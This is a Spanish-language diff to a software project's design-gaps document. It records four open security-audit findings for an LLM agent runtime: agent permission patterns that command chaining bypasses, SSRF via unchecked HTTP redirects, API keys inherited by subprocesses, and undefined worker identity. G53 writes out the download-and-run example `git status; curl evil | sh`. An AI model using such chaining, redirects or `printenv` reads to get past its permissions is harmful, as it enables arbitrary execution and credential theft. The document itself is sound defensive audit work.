@@ -9,7 +9,13 @@ resolución se aplica a los documentos afectados y la entrada pasa a
 aquello es lo que decidimos no decidir; esto son agujeros que la v1 sí
 necesita cerrados.
 
-**Estado: 48 registradas, 48 resueltas, 0 abiertas** (G52 añadida
+**Estado: 52 registradas, 48 resueltas, 4 abiertas** (G53–G56 añadidas
+2026-07-16 desde la auditoría de seguridad
+([auditoria-seguridad-2026-07-16.md](audits/auditoria-seguridad-2026-07-16.md)):
+grietas de diseño de SEC-02/03/04/07 —semántica de emparejamiento de permisos,
+control de redirects en `nu.http`, scrubbing de secretos del entorno, e
+identidad de un worker para las primitivas [W]—, **abiertas** a la espera de
+decisión del propietario. G52 añadida
 2026-07-14 desde A-38 de la auditoría integral — `Ws:send` sin vía binaria y
 `Ws:recv` sin distinguir el tipo de frame — resuelta por adición a `api.md`
 §8, nivel de API 2→3; G44–G51
@@ -1181,3 +1187,84 @@ binario, o un simple relay fiel.
 UTF-8 del payload (descartada: tipo de frame dependiente del contenido).
 (c) Modo por conexión en `ws.connect` (descartada: los protocolos mixtos
 existen y obligaría a dos conexiones o a un modo "raw" igual de explícito).
+
+## G53 · La semántica de emparejamiento de los patrones de permiso `tool[:argumento]` no está especificada, y en `bash` el encadenamiento la vuelve una frontera falsa — `agente.md` §5 / `chat.md` §5 / `guia-plugins.md` — **ABIERTO**
+
+**Problema.** Ningún documento fija el algoritmo con que un permiso `allow`/`deny`
+de la forma `tool:argumento` casa contra una petición concreta. Con emparejamiento
+por glob sobre el string crudo del comando —el comportamiento implícito hoy—,
+`allow='bash:git *'` autoriza de facto `bash:*`: basta encadenar
+(`git status; curl evil | sh`) para que el prefijo casado arrastre un comando
+arbitrario. Simétricamente, `deny='bash:rm *'` se evade con `/bin/rm` o `rm-alias`.
+Es la defensa **anunciada** contra prompt injection en un agente headless de CI.
+Detectado en SEC-02 de la auditoría de seguridad (2026-07-16), confirmado tras
+verificación adversarial doble.
+
+**Impacto.** El modelo de permisos, que es la barrera entre "el LLM propone" y
+"la máquina ejecuta", no ofrece la garantía que su sintaxis sugiere. Un allow
+razonable concede ejecución arbitraria; un deny razonable no cierra lo que nombra.
+
+**Dirección (a decidir).** (a) Especificar el algoritmo de match en `api.md`/`agente.md`
+y decidir si `bash:` empareja contra el **string crudo** (glob, no-frontera → el
+contrato debe **advertir** explícitamente que un patrón de `bash` no acota lo que
+se ejecuta) o contra el **programa parseado** (primer token / árbol de comandos,
+rechazando encadenamiento salvo opt-in). (b) Tratar `bash` como caso especial con
+su propia gramática de permisos. La resolución debe propagarse a los ejemplos de
+`chat.md` §5 y a `guia-plugins.md`. (Origen: SEC-02.)
+
+## G54 · `nu.http`/`nu.http.stream` siguen redirects sin control: no es expresable no-seguirlos ni observar la cadena — `api.md` §8 — **ABIERTO**
+
+**Problema.** El cliente HTTP sigue las redirecciones automáticamente y la API v1
+no ofrece forma de desactivarlo, limitarlas ni inspeccionar la cadena. Un `302`
+hacia `169.254.169.254` (u otro destino interno) evade cualquier validación que
+un adaptador hiciera sobre la URL **inicial** —amplificación de SSRF— y un
+open-redirect cross-host puede arrastrar cabeceras sensibles al nuevo destino.
+Corolario de completitud: hoy la mitigación **no es expresable** componiendo la
+API existente. Detectado en SEC-03 (2026-07-16).
+
+**Impacto.** Cualquier adaptador de provider o plugin que acepte URLs de terceros
+(o que un LLM las proponga) queda expuesto a SSRF por redirect, sin herramienta
+en la API para defenderse.
+
+**Dirección (a decidir).** Adición **por adición** a `api.md` §8 (incrementa
+`nu.version.api`): una opción `redirect`/`max_redirects` que permita no seguir
+redirects o acotar la cadena, y/o depuración por defecto de cabeceras sensibles
+en saltos cross-host. Debe cubrir tanto `nu.http` como `nu.http.stream`.
+(Origen: SEC-03.)
+
+## G55 · Los secretos del provider se heredan por defecto en el entorno de todo subproceso lanzado por la tool `bash`/`nu.proc` — extensión `agent` / `nu.proc` §6 — **ABIERTO**
+
+**Problema.** Las variables de entorno que portan las API keys de los providers
+(`api_key_env` y conocidas equivalentes) se propagan sin filtrar al entorno de
+los subprocesos que arranca la tool `bash` (y `nu.proc` en general). Un comando
+propuesto por el LLM —o un script de build hostil— puede leer la clave con un
+simple `env`/`printenv`. Distinto de `P7`, que cubre la redacción de secretos en
+los *transcripts*, no en el *entorno* heredado. Detectado en SEC-04 (2026-07-16).
+
+**Impacto.** Exfiltración trivial de credenciales de LLM desde cualquier
+subproceso, sin que el usuario haya concedido acceso a esos secretos.
+
+**Dirección (a decidir).** Especificar en el contrato de la extensión `agent`
+(y/o en `nu.proc` §6) que las variables `api_key_env` conocidas se **recortan por
+defecto** del entorno de los subprocesos, con opt-in explícito para heredarlas
+cuando de verdad se necesiten. (Origen: SEC-04.)
+
+## G56 · El contrato [W] no define la identidad/dueño de un worker para las primitivas atribuidas por owner — `api.md` §13/§16 / `agente.md` — **ABIERTO**
+
+**Problema.** Las primitivas marcadas [W] que se atribuyen a un "dueño" (p. ej.
+`nu.log`, `nu.proc`) no tienen definido bajo qué identidad corren cuando se
+invocan **desde un worker**, donde no hay una task-padre viva de la que heredar el
+owner. El contrato calla, y la implementación resuelve el hueco leyendo
+`rt.ownerStack` del padre —lo que además introduce el data race de SEC-05 (dos
+hilos tocando esa pila)—. Detectado en SEC-07 (2026-07-16); su resolución elimina
+de paso la causa raíz de SEC-05.
+
+**Impacto.** Comportamiento indefinido (y no determinista, por la carrera) en la
+atribución de logs y procesos lanzados desde workers; ambigüedad de auditoría
+sobre "quién hizo qué".
+
+**Dirección (a decidir).** Fijar en `api.md` §13/§16 y `agente.md` bajo qué
+identidad corren las primitivas [W] en un worker: owner fijo (`"worker"` o el
+nombre del módulo), o negar la atribución en ese contexto. La decisión debe
+permitir retirar la lectura de `rt.ownerStack` del padre. (Origen: SEC-07;
+elimina el data race de SEC-05.)
